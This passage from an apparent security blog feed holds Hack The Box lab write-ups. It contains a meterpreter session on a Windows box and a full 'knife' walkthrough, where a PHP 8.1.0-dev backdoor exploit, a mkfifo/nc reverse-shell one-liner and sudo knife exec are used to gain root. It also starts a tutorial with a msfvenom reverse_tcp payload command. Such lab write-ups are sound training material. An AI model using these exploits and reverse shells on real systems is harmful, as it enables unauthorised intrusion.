dir   2021-04-12 15:55:58 -0400  Administration</span><br><span class="line">100666/rw-rw-rw-  1       fil   2015-07-10 09:20:06 -0400  BOOTNXT</span><br><span class="line">40777/rwxrwxrwx   0       dir   2015-07-10 08:21:38 -0400  Documents and Settings</span><br><span class="line">0000/---------    0       fif   1969-12-31 19:00:00 -0500  DumpStack.log.tmp</span><br><span class="line">40777/rwxrwxrwx   0       dir   2019-12-07 04:14:52 -0500  PerfLogs</span><br><span class="line">40555/r-xr-xr-x   4096    dir   2019-12-07 04:14:52 -0500  Program Files</span><br><span class="line">40555/r-xr-xr-x   4096    dir   2019-12-07 04:14:52 -0500  Program Files (x86)</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2019-12-07 04:14:52 -0500  ProgramData</span><br><span class="line">40777/rwxrwxrwx   0       dir   2021-04-12 15:18:22 -0400  Recovery</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2021-04-12 15:16:36 -0400  System Volume Information</span><br><span class="line">40555/r-xr-xr-x   4096    dir   2019-12-07 04:03:44 -0500  Users</span><br><span class="line">40777/rwxrwxrwx   16384   dir   2019-12-07 04:03:44 -0500  Windows</span><br><span class="line">100444/r--r--r--  395268  fil   2015-07-10 09:20:06 -0400  bootmgr</span><br><span class="line">0000/---------    0       fif   1969-12-31 19:00:00 -0500  pagefile.sys</span><br><span class="line">0000/---------    0       fif   1969-12-31 19:00:00 -0500  swapfile.sys</span><br><span class="line">40777/rwxrwxrwx   12288   dir   2021-04-12 11:16:48 -0400  xampp</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd Users</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\Users</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2021-04-12 17:06:49 -0400  Administrator</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-07 04:30:39 -0500  All Users</span><br><span class="line">40555/r-xr-xr-x   8192  dir   2019-12-07 04:03:44 -0500  Default</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-07 04:30:39 -0500  Default User</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2021-04-12 17:41:34 -0400  Phoebe</span><br><span class="line">40555/r-xr-xr-x   4096  dir   2019-12-07 04:14:52 -0500  Public</span><br><span class="line">100666/rw-rw-rw-  174   fil   2019-12-07 04:14:54 -0500  desktop.ini</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd Administrator</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\Users\Administrator</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">Mode              Size     Type  Last modified              Name</span><br><span class="line">----              ----     ----  -------------              ----</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:55:12 -0400  3D Objects</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:49 -0400  AppData</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Application Data</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:55:12 -0400  Contacts</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Cookies</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Desktop</span><br><span class="line">40555/r-xr-xr-x   4096     dir   2021-04-12 17:06:49 -0400  Documents</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Downloads</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Favorites</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Links</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Local Settings</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Music</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  My Documents</span><br><span class="line">100666/rw-rw-rw-  1048576  fil   2021-04-12 17:06:49 -0400  NTUSER.DAT</span><br><span class="line">100666/rw-rw-rw-  65536    fil   2021-04-12 17:06:50 -0400  NTUSER.DAT&#123;53b39e88-18c4-11ea-a811-000d3aa4692b&#125;.TM.blf</span><br><span class="line">100666/rw-rw-rw-  524288   fil   2021-04-12 17:06:50 -0400  NTUSER.DAT&#123;53b39e88-18c4-11ea-a811-000d3aa4692b&#125;.TMContainer0000000000</span><br><span class="line">                                                            0000000001.regtrans-ms</span><br><span class="line">100666/rw-rw-rw-  524288   fil   2021-04-12 17:06:50 -0400  NTUSER.DAT&#123;53b39e88-18c4-11ea-a811-000d3aa4692b&#125;.TMContainer0000000000</span><br><span class="line">                                                            0000000002.regtrans-ms</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  NetHood</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 18:00:20 -0400  OneDrive</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Pictures</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  PrintHood</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Recent</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Saved Games</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:55:12 -0400  Searches</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  SendTo</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Start Menu</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Templates</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Videos</span><br><span class="line">100666/rw-rw-rw-  316416   fil   2021-04-12 17:06:50 -0400  ntuser.dat.LOG1</span><br><span class="line">100666/rw-rw-rw-  90112    fil   2021-04-12 17:06:50 -0400  ntuser.dat.LOG2</span><br><span class="line">100666/rw-rw-rw-  20       fil   2021-04-12 17:06:50 -0400  ntuser.ini</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd Desktop</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\Users\Administrator\Desktop</span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  282   fil   2021-04-12 17:55:12 -0400  desktop.ini</span><br><span class="line">100444/r--r--r--  34    fil   2021-04-13 06:20:17 -0400  root.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cat root.txt </span><br><span class="line">*************************************</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/08/05/HTB-love/image-20210805133747044.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-knife</title>
    <link href="https://lunamoore.github.io/2021/07/29/HTB-knife/"/>
    <id>https://lunamoore.github.io/2021/07/29/HTB-knife/</id>
    <published>2021-07-29T08:31:42.000Z</published>
    <updated>2021-07-29T08:33:52.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/07/29/HTB-knife/image-20210729150203513.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>åªå¼€æ”¾äº†22ã€80ç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/knife]</span><br><span class="line">â””â”€# nmap -sC -sV -sT 10.10.10.242 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 02:30 EDT</span><br><span class="line">Nmap scan report for 10.10.10.242</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)</span><br><span class="line">|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)</span><br><span class="line">|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Emergent Medical Idea</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.03 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ä¸€æ³¢å•¥ä¹Ÿæ²¡æœ‰å‘ç°</code></p><img src="/2021/07/29/HTB-knife/image-20210729150450213.png" class><h2 id="0x03-åˆ—ä¸€æ³¢ç›®å½•"><a href="#0x03-åˆ—ä¸€æ³¢ç›®å½•" class="headerlink" title="0x03.åˆ—ä¸€æ³¢ç›®å½•"></a>0x03.åˆ—ä¸€æ³¢ç›®å½•</h2><p><code>ä¹Ÿæ˜¯ä»€ä¹ˆä¹Ÿæ²¡æœ‰</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# gobuster dir -u http://10.10.10.242 -w /usr/share/wordlists/dirb/common.txt                                                                                 1 â¨¯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.242</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 02:50:15 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.hta                 (Status: 403) [Size: 277]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 277]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 277]</span><br><span class="line">/index.php            (Status: 200) [Size: 5815]</span><br><span class="line">/server-status        (Status: 403) [Size: 277]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 02:53:11 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-webæŒ‡çº¹æœé›†"><a href="#0x04-webæŒ‡çº¹æœé›†" class="headerlink" title="0x04.webæŒ‡çº¹æœé›†"></a>0x04.webæŒ‡çº¹æœé›†</h2><p><code>å‘ç°PHP/8.1.0-devï¼Œæœ€è¿‘åˆšçˆ†å‡ºä¸€ä¸ªæ¼æ´</code><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3BocC84LjEtYmFja2Rvb3Iv">è¯¦æƒ…å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/knife]</span><br><span class="line">â””â”€# whatweb http://10.10.10.242/                                                                                                                              130 â¨¯</span><br><span class="line">http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]</span><br></pre></td></tr></table></figure><h2 id="0x05-exploit-dbæœç´¢"><a href="#0x05-exploit-dbæœç´¢" class="headerlink" title="0x05.exploit-dbæœç´¢"></a>0x05.exploit-dbæœç´¢</h2><img src="/2021/07/29/HTB-knife/image-20210729151157463.png" class><h2 id="0x06-ä¸‹è½½åˆ©ç”¨"><a href="#0x06-ä¸‹è½½åˆ©ç”¨" class="headerlink" title="0x06.ä¸‹è½½åˆ©ç”¨"></a>0x06.ä¸‹è½½åˆ©ç”¨</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/raw/49933</span><br><span class="line">mv 49933 php8.1.0.rce.py</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/knife]</span><br><span class="line">â””â”€# python3 php8.1.0.rce.py</span><br><span class="line">Enter the full host url:</span><br><span class="line">http://10.10.10.242</span><br><span class="line"></span><br><span class="line">Interactive shell is opened on http://10.10.10.242</span><br><span class="line">Can&#x27;t acces tty; job crontol turned off.</span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">james</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /home/james/user.txt</span></span><br><span class="line">**********************</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h2 id="0x07-ææƒ"><a href="#0x07-ææƒ" class="headerlink" title="0x07.ææƒ"></a>0x07.ææƒ</h2><h3 id="01-åå¼¹shell"><a href="#01-åå¼¹shell" class="headerlink" title="01.åå¼¹shell"></a>01.åå¼¹shell</h3><p><code>è¿™ä¸ªshellå¤ªéš¾çœ‹ï¼Œåå¼¹ä¸ªshellå›æ¥ï¼Œkaliå…ˆç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ç›®æ ‡ä¸»æœºæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc your_ip your_port &gt;/tmp/f</span></span><br></pre></td></tr></table></figure><p><code>è¿”å›shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 6666                                                                                                                                               1 â¨¯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.242] 34644</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta">$</span><span class="bash"> id</span></span><br><span class="line">uid=1000(james) gid=1000(james) groups=1000(james)</span><br><span class="line"><span class="meta">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="02-sudo-lææƒ"><a href="#02-sudo-lææƒ" class="headerlink" title="02.sudo -lææƒ"></a>02.sudo -lææƒ</h3><p><code>sudo -lå‘ç°knifeå‘½ä»¤(ç‚¹é¢˜äº†ã€‚ã€‚ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo -l</span></span><br><span class="line">Matching Defaults entries for james on knife:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on knife:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/knife</span><br><span class="line"><span class="meta">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ç›´æ¥æ•²knifeå°±å¯ä»¥çœ‹åˆ°ä»–çš„å‚æ•°ä¸infoï¼Œå¤ªå¤šäº†ï¼Œå°±åˆ—å‡ºexecæ¨¡å—</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> knife</span></span><br><span class="line">ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)</span><br><span class="line"></span><br><span class="line">Usage: knife sub-command (options)</span><br><span class="line">    -s, --server-url URL             Chef Infra Server URL.</span><br><span class="line">        --chef-zero-host HOST        Host to start Chef Infra Zero on.</span><br><span class="line">        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.</span><br><span class="line">    -k, --key KEY                    Chef Infra Server API client key.</span><br><span class="line">        --[no-]color                 Use colored output, defaults to enabled.</span><br><span class="line">    -c, --config CONFIG              The configuration file to use.</span><br><span class="line">        --config-option OPTION=VALUE Override a single configuration option.</span><br><span class="line">        --defaults                   Accept default values for all questions.</span><br><span class="line">    -d, --disable-editing            Do not open EDITOR, just accept the data as is.</span><br><span class="line">    -e, --editor EDITOR              Set the editor to use for interactive commands.</span><br><span class="line">    -E, --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).</span><br><span class="line">        --[no-]fips                  Enable FIPS mode.</span><br><span class="line">    -F, --format FORMAT              Which format to use for output. (valid options: &#x27;summary&#x27;, &#x27;text&#x27;, &#x27;json&#x27;, &#x27;yaml&#x27;, or &#x27;pp&#x27;)</span><br><span class="line">        --[no-]listen                Whether a local mode (-z) server binds to a port.</span><br><span class="line">    -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.</span><br><span class="line">    -u, --user USER                  Chef Infra Server API client username.</span><br><span class="line">        --print-after                Show the data after a destructive operation.</span><br><span class="line">        --profile PROFILE            The credentials profile to select.</span><br><span class="line">    -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.</span><br><span class="line">    -v, --version                    Show Chef Infra Client version.</span><br><span class="line">    -y, --yes                        Say yes to all prompts for confirmation.</span><br><span class="line">    -h, --help                       Show this help message.</span><br><span class="line"></span><br><span class="line">Available subcommands: (for details, knife SUB-COMMAND --help)</span><br><span class="line"></span><br><span class="line">************</span><br><span class="line"></span><br><span class="line">** EXEC COMMANDS **</span><br><span class="line">knife exec [SCRIPT] (options)</span><br><span class="line"></span><br><span class="line">** GOOGLE COMMANDS **</span><br><span class="line">knife google disk create NAME --gce-disk-size N (options)</span><br><span class="line">knife google disk delete NAME [NAME] (options)</span><br><span class="line">knife google disk list</span><br><span class="line">knife google image list</span><br><span class="line">knife google project quotas</span><br><span class="line">knife google region list</span><br><span class="line">knife google region quotas</span><br><span class="line">knife google server create NAME -m MACHINE_TYPE -I IMAGE (options)</span><br><span class="line">knife google server delete INSTANCE_NAME [INSTANCE_NAME] (options)</span><br><span class="line">knife google server list</span><br><span class="line">knife google server show INSTANCE_NAME (options)</span><br><span class="line">knife google zone list</span><br><span class="line"></span><br><span class="line">***************************************</span><br><span class="line">** YAML COMMANDS **</span><br><span class="line">knife yaml convert YAML_FILENAME [RUBY_FILENAME]</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNoZWYuaW8vd29ya3N0YXRpb24va25pZmVfZXhlYy8=">knifeå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><p><code>ææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo knife <span class="built_in">exec</span> --<span class="built_in">exec</span> <span class="string">&quot;exec &#x27;/bin/bash -i&#x27;&quot;</span></span></span><br><span class="line">bash: cannot set terminal process group (967): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@knife:/home/james#</span><br><span class="line">root@knife:/home/james# cd</span><br><span class="line">cd</span><br><span class="line">root@knife:~# ls</span><br><span class="line">ls</span><br><span class="line">delete.sh</span><br><span class="line">root.txt</span><br><span class="line">snap</span><br><span class="line">root@knife:~# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">***************************</span><br><span class="line">root@knife:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/07/29/HTB-knife/image-20210729150203513.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€æµ‹è¯•-æƒé™æå‡</title>
    <link href="https://lunamoore.github.io/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://lunamoore.github.io/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2021-07-29T06:12:42.000Z</published>
    <updated>2021-07-29T06:18:16.946Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-æ¼æ´å‘ç°"><a href="#0x01-æ¼æ´å‘ç°" class="headerlink" title="0x01.æ¼æ´å‘ç°"></a>0x01.æ¼æ´å‘ç°</h2><h3 id="1-WMICå‘ç°å®‰è£…è¡¥ä¸"><a href="#1-WMICå‘ç°å®‰è£…è¡¥ä¸" class="headerlink" title="1.WMICå‘ç°å®‰è£…è¡¥ä¸"></a>1.WMICå‘ç°å®‰è£…è¡¥ä¸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h3 id="2-msfå‘ç°å®‰è£…è¡¥ä¸"><a href="#2-msfå‘ç°å®‰è£…è¡¥ä¸" class="headerlink" title="2.msfå‘ç°å®‰è£…è¡¥ä¸"></a>2.msfå‘ç°å®‰è£…è¡¥ä¸</h3><p><code>é¦–å…ˆä½¿ç”¨msfvenomç”Ÿæˆæ¶æ„ç¨‹åº</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=6666 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>å¯åŠ¨msfç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 